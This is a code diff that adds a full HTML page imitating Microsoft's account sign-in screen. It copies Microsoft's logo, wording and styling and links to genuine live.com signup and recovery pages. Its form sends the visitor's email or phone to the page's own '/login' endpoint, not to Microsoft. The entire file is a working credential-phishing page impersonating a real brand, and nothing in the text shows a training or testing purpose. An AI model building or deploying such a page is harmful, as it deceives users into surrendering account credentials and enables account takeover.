@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to Microsoft account</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "Segoe UI", system-ui, -apple-system, sans-serif;
+        }
+
+        body {
+            background-color: #fff;
+            color: #1b1b1b;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            line-height: 1.5;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 440px;
+            padding: 44px;
+            border: 1px solid #e1e1e1;
+            border-radius: 4px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+
+        .logo {
+            width: 44px;
+            height: 44px;
+            margin-right: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .logo svg {
+            width: 32px;
+            height: 32px;
+        }
+
+        .header-text h1 {
+            font-size: 21px;
+            font-weight: 600;
+            color: #1b1b1b;
+        }
+
+        .title {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #616161;
+            margin-bottom: 24px;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 6px;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 10px 12px;
+            font-size: 15px;
+            border: 1px solid #d1d1d1;
+            border-radius: 4px;
+            transition: border-color 0.2s;
+        }
+
+        input[type="text"]:focus {
+            outline: none;
+            border-color: #0067b8;
+            box-shadow: 0 0 0 1px #0067b8;
+        }
+
+        .forgot-link {
+            display: inline-block;
+            font-size: 13px;
+            color: #0067b8;
+            text-decoration: none;
+            margin-bottom: 20px;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .next-btn {
+            width: 100%;
+            background-color: #0067b8;
+            color: white;
+            border: none;
+            padding: 10px 12px;
+            font-size: 15px;
+            font-weight: 600;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .next-btn:hover {
+            background-color: #005da6;
+        }
+
+        .signup-section {
+            margin-top: 24px;
+            padding-top: 24px;
+            border-top: 1px solid #e1e1e1;
+        }
+
+        .signup-text {
+            font-size: 13px;
+            color: #616161;
+            margin-bottom: 16px;
+        }
+
+        .signup-link {
+            display: inline-block;
+            font-size: 13px;
+            color: #0067b8;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .signup-link:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            margin-top: 40px;
+            text-align: center;
+            font-size: 12px;
+            color: #616161;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            margin-top: 16px;
+        }
+
+        .footer-links a {
+            color: #616161;
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+            color: #0067b8;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 24px;
+                border: none;
+                box-shadow: none;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path fill="#f25022" d="M0 0h11.5v11.5H0z"/>
+                    <path fill="#00a4ef" d="M12.5 0H24v11.5H12.5z"/>
+                    <path fill="#7fba00" d="M0 12.5h11.5V24H0z"/>
+                    <path fill="#ffb900" d="M12.5 12.5H24V24H12.5z"/>
+                </svg>
+            </div>
+            <div class="header-text">
+                <h1>Microsoft</h1>
+            </div>
+        </div>
+
+        <h2 class="title">Sign in</h2>
+        <p class="subtitle">Use your Microsoft account</p>
+
+        <form action="/login" method="POST">
+    <div class="form-group">
+        <label for="email">Email, phone, or Skype</label>
+        <input type="text" id="email" name="email" autocomplete="username">
+    </div>
+
+    <a href="https://signup.live.com/signup?contextid=56E50A352408621C&opid=D460E84FAD3FFA5B&bk=1758680374&sru=https://login.live.com/oauth20_authorize.srf%3fclient_id%3d1f907974-e22b-4810-a9de-d9647380c97e%26client_id%3d1f907974-e22b-4810-a9de-d9647380c97e%26contextid%3d56E50A352408621C%26opid%3dD460E84FAD3FFA5B%26mkt%3dEN-US%26lc%3d1033%26bk%3d1758680374%26uaid%3d5aa1bcccb6594bbc8ebbad529c3f88e1&uiflavor=web&fluent=2&client_id=000000004C5BC0A9&lic=1&mkt=EN-US&lc=1033&uaid=5aa1bcccb6594bbc8ebbad529c3f88e1" class="forgot-link">No account? Create one!</a>
+
+    <div class="form-group">
+        <a href="https://account.live.com/username/recover?wreply=https://login.live.com/oauth20_authorize.srf%3flc%3d1033%26client_id%3d1f907974-e22b-4810-a9de-d9647380c97e%26mkt%3dEN-US%26client_id%3d1f907974-e22b-4810-a9de-d9647380c97e%26contextid%3dA96728332313788A%26opid%3dA4587A10E520E4CB%26bk%3d1758680763%26uaid%3d5aa1bcccb6594bbc8ebbad529c3f88e1&id=290794&client_id=1E00004C5BC0A9&fluent=2&mkt=EN-US&lc=1033&uaid=5aa1bcccb6594bbc8ebbad529c3f88e1&uiflavor=web" class="forgot-link">Forgot my username</a>
+    </div>
+
+    <button type="submit" class="next-btn">Next</button>
+</form>
+
+
+        <div class="signup-section">
+            <p class="signup-text">No account?</p>
+            <a href="https://signup.live.com/signup?contextid=56E50A352408621C&opid=D460E84FAD3FFA5B&bk=1758680374&sru=https://login.live.com/oauth20_authorize.srf%3fclient_id%3d1f907974-e22b-4810-a9de-d9647380c97e%26client_id%3d1f907974-e22b-4810-a9de-d9647380c97e%26contextid%3d56E50A352408621C%26opid%3dD460E84FAD3FFA5B%26mkt%3dEN-US%26lc%3d1033%26bk%3d1758680374%26uaid%3d5aa1bcccb6594bbc8ebbad529c3f88e1&uiflavor=web&fluent=2&client_id=000000004C5BC0A9&lic=1&mkt=EN-US&lc=1033&uaid=5aa1bcccb6594bbc8ebbad529c3f88e1" class="signup-link">Create one!</a>
+        </div>
+
+        <div class="footer">
+            <div class="footer-links">
+                <a href="#">Terms of use</a>
+                <a href="#">Privacy & cookies</a>
+                <a href="#">Help</a>
+            </div>
+        </div>
+    </div>
+
+</body>
+</html>
